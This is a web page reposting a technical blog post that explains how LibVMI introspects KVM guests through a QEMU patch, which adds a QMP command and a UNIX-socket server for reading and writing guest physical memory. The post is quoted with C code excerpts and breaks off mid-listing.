<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Index of Computer System and Security</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
    <meta name="keywords" content="computer system, computer security" />
  
  
  
  
  <meta name="description" content="FROM 0 TO 1">
<meta property="og:type" content="website">
<meta property="og:title" content="Index of Computer System and Security">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Index of Computer System and Security">
<meta property="og:description" content="FROM 0 TO 1">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Index of Computer System and Security">
<meta name="twitter:description" content="FROM 0 TO 1">
  
    <link rel="alternate" href="/atom.xml" title="Index of Computer System and Security" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >
  <link rel="stylesheet" href="/css/hiero.css" >
  <link rel="stylesheet" href="/css/glyphs.css" >

</head>

<body>
  <header id="allheader" class="site-header" role="banner">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            <a href="/" title="Index of Computer System and Security" rel="home">
              Index of Computer System and Security</a>
          </h1>
          <div class="site-description">FROM 0 TO 1</div>

            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>
            <div class="clearfix sf-menu">

              <ul id="main-nav" class="nmenu sf-js-enabled">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">首页</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/syssec">系统安全</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/architecture">体系结构</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/virtualization">虚拟化</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/conferences">主流会议</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/academy">学术专家</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/celebrity">工业大咖</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/contribution">本站达人</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">关于</a> </li>
                    
              </ul>
            </div>
          </nav>


      </div>
  </div>
</header>




  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main">
  
    <article id="post-libvmikvm"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170102/libvmikvm/">KVM Support in Libvmi</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170102/libvmikvm/" class="article-date">
	  <time datetime="2017-01-02T03:02:18.000Z" itemprop="datePublished">一月 2, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://ytliu.info/blog/2014/03/27/kvm-support-in-libvmi/" target="_blank" rel="external">ytliu</a><br>编辑：@Tula</p>
<hr>
<p><strong>CSysSec注</strong>： 本文介绍Libvmi对KVM的支持。作者ytliu，来自上海交通大学PhD,研究方向是虚拟化与系统安全，在顶会CCS，HPCA等发表多篇文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmikvm/" target="_blank" rel="external">Libvmi Setup</a>》</p>
<hr>
<p>Several months ago I’ve post 2 blogs to introduce <a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">how to setup libvmi</a> and <a href="http://www.csyssec.org/20170102/libvmiintrospection/" target="_blank" rel="external">how to write your own tools using libvmi</a>. These two posts are based on Xen virtualization environment. Today I’m trying to use Libvmi for KVM virtual machine introspection, which need more effort to do such task.</p>
<p>In the rest of this blog, I will briefly introduce why this effort need to be done and how to do that.</p>
<hr>
<p>Before we start, let’s firstly see how document in libvmi github page saying about KVM Support:</p>
<blockquote>
<ul>
<li><h5 id="If-you-would-like-LibVMI-to-work-on-KVM-VM’s-you-must-do-some-additional-setup-This-is-because-KVM-doesn’t-have-much-built-in-capability-for-introspection"><a href="#If-you-would-like-LibVMI-to-work-on-KVM-VM’s-you-must-do-some-additional-setup-This-is-because-KVM-doesn’t-have-much-built-in-capability-for-introspection" class="headerlink" title="If you would like LibVMI to work on KVM VM’s, you must do some additional setup. This is because KVM doesn’t have much built-in capability for introspection."></a>If you would like LibVMI to work on KVM VM’s, you must do some additional setup. This is because KVM doesn’t have much built-in capability for introspection.</h5></li>
<li><h5 id="You-only-need-one-memory-access-technique-LibVMI-will-first-look-for-the-QEMU-KVM-patch-and-use-that-if-it-is-installed-Otherwise-it-will-fall-back-to-using-GDB"><a href="#You-only-need-one-memory-access-technique-LibVMI-will-first-look-for-the-QEMU-KVM-patch-and-use-that-if-it-is-installed-Otherwise-it-will-fall-back-to-using-GDB" class="headerlink" title="You only need one memory access technique. LibVMI will first look for the QEMU-KVM patch and use that if it is installed. Otherwise it will fall back to using GDB."></a>You only need one memory access technique. LibVMI will first look for the QEMU-KVM patch and use that if it is installed. Otherwise it will fall back to using GDB.</h5></li>
</ul>
</blockquote>
<p>And now Libvmi provide 3 ways to support KVM introspection:</p>
<blockquote>
<ul>
<li>Enable GDB access to your KVM VM, which is the slowest approach;</li>
<li>Patch QEMU-KVM with the provided patch, which is much faster;</li>
<li>Use Shm-snapshot Support to introspect on a memory snapshot, which is the fatest one.</li>
</ul>
</blockquote>
<p>In this blog, I’ll not consider the GDB method since it will introduce much overhead, and only discuss about the second QEMU-KVM patch way. While the third Shm-snapshot will be introduced in the future.</p>
<p>So as far as I’m concerned, why Libvmi require applying a qemu patch to introspect KVM virtual machine is for following reasons:</p>
<blockquote>
<ul>
<li>Libvmi use libvirt framework API to manage and get data from guest virtual machine;</li>
<li>However, unlike libxenctrl used in Xen, libvirt for KVM does not provide any API to map Guest Physical Address (GPA) to Host Virtual Address (HVA);</li>
<li>While in qemu, there is a function called <code>cpu_physical_memory_map</code> in <code>qemu/exec.c</code> file which can map guest GPA to HVA.</li>
</ul>
</blockquote>
<p>So what the patch actually do is use Qemu Machine Protocal (QMP) mechanism for libvmi to pass the GPA, and call the internal function <code>cpu_physical_memory_map</code> located in <code>qemu/exec.c</code> in Qemu, and finally get the mapped HVA back.</p>
<hr>
<p>Actually the patch are used for some specific qemu versions, so I think I should just tell why it works, and how to make it work in general.</p>
<h4 id="Create-a-connection-inside-Qemu-for-Libvmi-to-communicate"><a href="#Create-a-connection-inside-Qemu-for-Libvmi-to-communicate" class="headerlink" title="Create a connection inside Qemu for Libvmi to communicate"></a>Create a connection inside Qemu for Libvmi to communicate</h4><p>The entry function is <code>do_physical_memory_access()</code>, we can put it anywhere, for example, Libvmi patch put it in <code>qemu/monitor.c</code> file:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_physical_memory_access</span><span class="params">(Monitor *mon, <span class="keyword">const</span> QDict *qdict, QObject **ret_data)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *path = qdict_get_str(qdict, <span class="string">"path"</span>);</div><div class="line">  memory_access_start(path);</div><div class="line">  <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>This function will have a input parameter <code>path</code>，with which to invoke <code>memory_access_start()</code> function:</p>
<p>(Note: The following code are all located in <code>qemu/memory-access.c</code>)<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span></span></div><div class="line"><span class="title">memory_access_start</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">pthread_t</span> thread;</div><div class="line">  <span class="keyword">sigset_t</span> <span class="built_in">set</span>, oldset;</div><div class="line">  <span class="keyword">int</span> ret;</div><div class="line"></div><div class="line">  <span class="comment">// create a copy of path that we can safely use</span></div><div class="line">  <span class="keyword">char</span> *pathcopy = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(path) + <span class="number">1</span>);</div><div class="line">  <span class="built_in">memcpy</span>(pathcopy, path, <span class="built_in">strlen</span>(path) + <span class="number">1</span>);</div><div class="line"></div><div class="line">  <span class="comment">// start the thread</span></div><div class="line">  sigfillset(&amp;<span class="built_in">set</span>);</div><div class="line">  pthread_sigmask(SIG_SETMASK, &amp;<span class="built_in">set</span>, &amp;oldset);</div><div class="line">  ret = pthread_create(&amp;thread, <span class="literal">NULL</span>, memory_access_thread, pathcopy);</div><div class="line">  pthread_sigmask(SIG_SETMASK, &amp;oldset, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">  <span class="keyword">return</span> ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>This function will create a new thread, and run the <code>memory_access_thread()</code> function:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></div><div class="line"><span class="title">memory_access_thread</span> <span class="params">(<span class="keyword">void</span> *path)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">struct</span> sockaddr_un address;</div><div class="line">  <span class="keyword">int</span> socket_fd, connection_fd;</div><div class="line">  <span class="keyword">socklen_t</span> address_length;</div><div class="line"></div><div class="line">  socket_fd = socket(PF_UNIX, SOCK_STREAM, <span class="number">0</span>);</div><div class="line">  <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>)&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"QemuMemoryAccess: socket failed\n"</span>);</div><div class="line">    <span class="keyword">goto</span> error_exit;</div><div class="line">  &#125;</div><div class="line">  unlink(path);</div><div class="line">  address.sun_family = AF_UNIX;</div><div class="line">  address_length = <span class="keyword">sizeof</span>(address.sun_family) + <span class="built_in">sprintf</span>(address.sun_path, <span class="string">"%s"</span>, (<span class="keyword">char</span> *) path);</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (bind(socket_fd, (<span class="keyword">struct</span> sockaddr *) &amp;address, address_length) != <span class="number">0</span>)&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"QemuMemoryAccess: bind failed\n"</span>);</div><div class="line">  <span class="keyword">goto</span> error_exit;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (listen(socket_fd, <span class="number">0</span>) != <span class="number">0</span>)&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"QemuMemoryAccess: listen failed\n"</span>);</div><div class="line">  <span class="keyword">goto</span> error_exit;</div><div class="line">&#125;</div><div class="line"></div><div class="line">connection_fd = accept(socket_fd, (<span class="keyword">struct</span> sockaddr *) &amp;address, &amp;address_length);</div><div class="line">connection_handler(connection_fd);</div><div class="line"></div><div class="line">close(socket_fd);</div><div class="line">unlink(path);</div><div class="line">error_exit:</div><div class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>This function will create a socket, combine it with the <code>/tmp/path</code> named file, bind, listen for connection, and once any other process connect to such socket, it will invoke the <code>connection_handler()</code> function:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></div><div class="line"><span class="title">connection_handler</span> <span class="params">(<span class="keyword">int</span> connection_fd)</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> nbytes;</div><div class="line">  <span class="keyword">struct</span> request req;</div><div class="line"></div><div class="line">  <span class="keyword">while</span> (<span class="number">1</span>)&#123;</div><div class="line">    <span class="comment">// client request should match the struct request format</span></div><div class="line">    nbytes = read(connection_fd, &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> request));</div><div class="line">    <span class="keyword">if</span> (nbytes != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> request))&#123;</div><div class="line">      <span class="comment">// error</span></div><div class="line">      <span class="keyword">continue</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (req.type == <span class="number">0</span>)&#123;</div><div class="line">      <span class="comment">// request to quit, goodbye</span></div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (req.type == <span class="number">1</span>)&#123;</div><div class="line">      <span class="comment">// request to read</span></div><div class="line">      <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(req.length + <span class="number">1</span>);</div><div class="line">      nbytes = connection_read_memory(req.address, buf, req.length);</div><div class="line">      <span class="keyword">if</span> (nbytes != req.length)&#123;</div><div class="line">        <span class="comment">// read failure, return failure message</span></div><div class="line">        buf[req.length] = <span class="number">0</span>; <span class="comment">// set last byte to 0 for failure</span></div><div class="line">        nbytes = write(connection_fd, buf, <span class="number">1</span>);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span>&#123;</div><div class="line">        <span class="comment">// read success, return bytes</span></div><div class="line">        buf[req.length] = <span class="number">1</span>; <span class="comment">// set last byte to 1 for success</span></div><div class="line">        nbytes = write(connection_fd, buf, nbytes + <span class="number">1</span>);</div><div class="line">      &#125;</div><div class="line">      <span class="built_in">free</span>(buf);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (req.type == <span class="number">2</span>)&#123;</div><div class="line">      <span class="comment">// request to write</span></div><div class="line">      <span class="keyword">void</span> *write_buf = <span class="built_in">malloc</span>(req.length);</div><div class="line">      nbytes = read(connection_fd, &amp;write_buf, req.length);</div><div class="line">      <span class="keyword">if</span> (nbytes != req.length)&#123;</div><div class="line">        <span class="comment">// failed reading the message to write</span></div><div class="line">        send_fail_ack(connection_fd);</div><div class="line">      &#125;</div><div class="line">      <span class="keyword">else</span>&#123;</div><div class="line">        <span class="comment">// do the write</span></div><div class="line">        nbytes = connection_write_memory(req.address, write_buf, req.length);</div><div class="line">        <span class="keyword">if</span> (nbytes == req.length)&#123;</div><div class="line">          send_success_ack(connection_fd);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">          send_fail_ack(connection_fd);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">      <span class="built_in">free</span>(write_buf);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">      <span class="comment">// unknown command</span></div><div class="line">      <span class="built_in">printf</span>(<span class="string">"QemuMemoryAccess: ignoring unknown command (%d)\n"</span>, req.type);</div><div class="line">      <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">1</span>);</div><div class="line">      buf[<span class="number">0</span>] = <span class="number">0</span>;</div><div class="line">      nbytes = write(connection_fd, buf, <span class="number">1</span>);</div><div class="line">      <span class="built_in">free</span>(buf);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  close(connection_fd);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>This function will parse the request from the connection_fd, the types of request are divided to 3:</p>
<blockquote>
<ul>
<li>0: quit</li>
<li>1: read</li>
<li>2: write</li>
</ul>
</blockquote>
<p>Once it receive read request, it will invoke the <code>connection_read_memory()</code> function:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> uint64_t</span></div><div class="line"><span class="title">connection_read_memory</span> <span class="params">(<span class="keyword">uint64_t</span> user_paddr, <span class="keyword">void</span> *buf, <span class="keyword">uint64_t</span> user_len)</span></div><div class="line">&#123;</div><div class="line">    hwaddr paddr = (hwaddr) user_paddr;</div><div class="line">    hwaddr len = (hwaddr) user_len;</div><div class="line">    <span class="keyword">void</span> *guestmem = cpu_physical_memory_map(paddr, &amp;len, <span class="number">0</span>);</div><div class="line">    <span class="keyword">if</span> (!guestmem)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">memcpy</span>(buf, guestmem, len);</div><div class="line">    cpu_physical_memory_unmap(guestmem, len, <span class="number">0</span>, len);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> len;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Once it receive write request, it will invoke the <code>connection_write_memory()</code> function:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> uint64_t</span></div><div class="line"><span class="title">connection_write_memory</span> <span class="params">(<span class="keyword">uint64_t</span> user_paddr, <span class="keyword">void</span> *buf, <span class="keyword">uint64_t</span> user_len)</span></div><div class="line">&#123;</div><div class="line">    hwaddr paddr = (hwaddr) user_paddr;</div><div class="line">    hwaddr len = (hwaddr) user_len;</div><div class="line">    <span class="keyword">void</span> *guestmem = cpu_physical_memory_map(paddr, &amp;len, <span class="number">1</span>);</div><div class="line">    <span class="keyword">if</span> (!guestmem)&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">memcpy</span>(guestmem, buf, len);</div><div class="line">    cpu_physical_memory_unmap(guestmem, len, <span class="number">0</span>, len);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> len;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Then, what we need to do is to invoke the very beginning function <code>do_physical_memory_access()</code>. So here comes the QMP:</p>
<h4 id="Patch-QMP-to-provide-a-entry-to-invoke-do-physical-memory-access-method"><a href="#Patch-QMP-to-provide-a-entry-to-invoke-do-physical-memory-access-method" class="headerlink" title="Patch QMP to provide a entry to invoke do_physical_memory_access() method"></a>Patch QMP to provide a entry to invoke do_physical_memory_access() method</h4><p>How QMP works will be introduced in a new blog in the future. Here I just need to tell what need to add:</p>
<p>in <code>qemu/qmp-command.hx</code> file, we add following code:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  .name       = "pmemaccess",</div><div class="line">  .args_type  = "path:s",</div><div class="line">  .params     = "path",</div><div class="line">  .help       = "mount guest physical memory image at 'path'",</div><div class="line">  .user_print = monitor_user_noop,</div><div class="line">  .mhandler.cmd_new = do_physical_memory_access,</div><div class="line">&#125;,</div><div class="line"></div><div class="line">SQMP</div><div class="line">pmemaccess</div><div class="line">----------</div><div class="line"></div><div class="line">Mount guest physical memory image at 'path'.</div><div class="line"></div><div class="line">Arguments:</div><div class="line"></div><div class="line">- "path": mount point path (json-string)</div><div class="line"></div><div class="line">Example:</div><div class="line"></div><div class="line">-&gt; &#123; "execute": "pmemaccess",</div><div class="line">             "arguments": &#123; "path": "/tmp/guestname" &#125; &#125;</div><div class="line">&lt;- &#123; "return": &#123;&#125; &#125;</div><div class="line"></div><div class="line">EQMP</div></pre></td></tr></table></figure></p>
<p>Note that the code we need here is:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  .name       = <span class="string">"pmemaccess"</span>,</div><div class="line">  .args_type  = <span class="string">"path:s"</span>,</div><div class="line">  .params     = <span class="string">"path"</span>,</div><div class="line">  .help       = <span class="string">"mount guest physical memory image at 'path'"</span>,</div><div class="line">  .user_print = monitor_user_noop,</div><div class="line">  .mhandler.cmd_new = do_physical_memory_access,</div><div class="line">&#125;,</div></pre></td></tr></table></figure></p>
<p>the other code between <code>SQMP</code> and <code>EQMP</code> are just added to the documentation. But it is required!</p>
<p>After adding this command to Qemu QMP, we can invoke <code>do_physical_memory_access()</code> outside of Qemu using such format shown in Example section:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-&gt; &#123; <span class="string">"execute"</span>: <span class="string">"pmemaccess"</span>,</div><div class="line">             <span class="string">"arguments"</span>: &#123; <span class="string">"path"</span>: <span class="string">"/tmp/guestname"</span> &#125; &#125;</div><div class="line">&lt;- &#123; <span class="string">"return"</span>: &#123;&#125; &#125;</div></pre></td></tr></table></figure></p>
<p>For example, in Libvmi, you can find how it invokes this in <code>libvmi/driver/kvm.c</code> file:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// QMP Command Interactions</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *</span></div><div class="line"><span class="title">exec_qmp_cmd</span><span class="params">(</span></div><div class="line">    <span class="keyword">kvm_instance_t</span> *kvm,</div><div class="line">    <span class="keyword">char</span> *query)</div><div class="line">&#123;</div><div class="line">  ......</div><div class="line"></div><div class="line">  <span class="built_in">snprintf</span>(cmd, cmd_length, <span class="string">"virsh qemu-monitor-command %s %s"</span>, name,</div><div class="line">   query);</div><div class="line"></div><div class="line">  ......</div><div class="line"></div><div class="line">  p = popen(cmd, <span class="string">"r"</span>);</div><div class="line"></div><div class="line">  ......</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *</span></div><div class="line"><span class="title">exec_memory_access</span><span class="params">(</span></div><div class="line">  <span class="keyword">kvm_instance_t</span> *kvm)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> *tmpfile = tempnam(<span class="string">"/tmp"</span>, <span class="string">"vmi"</span>);</div><div class="line">  <span class="keyword">char</span> *query = (<span class="keyword">char</span> *) safe_malloc(<span class="number">256</span>);</div><div class="line"></div><div class="line">  <span class="built_in">sprintf</span>(query,</div><div class="line">  <span class="string">"'&#123;\"execute\": \"pmemaccess\", \"arguments\": &#123;\"path\": \"%s\"&#125;&#125;'"</span>,</div><div class="line">  tmpfile);</div><div class="line"></div><div class="line">  ......</div><div class="line"></div><div class="line">  <span class="keyword">char</span> *output = exec_qmp_cmd(kvm, query);</div><div class="line"></div><div class="line">  ......</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>And when it needs to read a page, it needs to map from GPA to HVA, then the libvmi will follow the control from:</p>
<p>vmi_read_va -&gt; (get GPA from vmi_translate_uv2p) -&gt; kvm_read_page -&gt; memory_cache_insert -&gt; create_new_entry -&gt; get_memory_data -&gt; get_memory_callback -&gt; kvm_get_memory_patch</p>
<p>For the last function, it can be found in file <code>libvmi/driver/kvm.c</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> *</span></div><div class="line"><span class="title">kvm_get_memory_patch</span><span class="params">(</span></div><div class="line">    <span class="keyword">vmi_instance_t</span> vmi,</div><div class="line">    <span class="keyword">addr_t</span> paddr,</div><div class="line">    <span class="keyword">uint32_t</span> length)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> *buf = safe_malloc(length + <span class="number">1</span>);</div><div class="line">  <span class="keyword">struct</span> request req;</div><div class="line"></div><div class="line">  req.type = <span 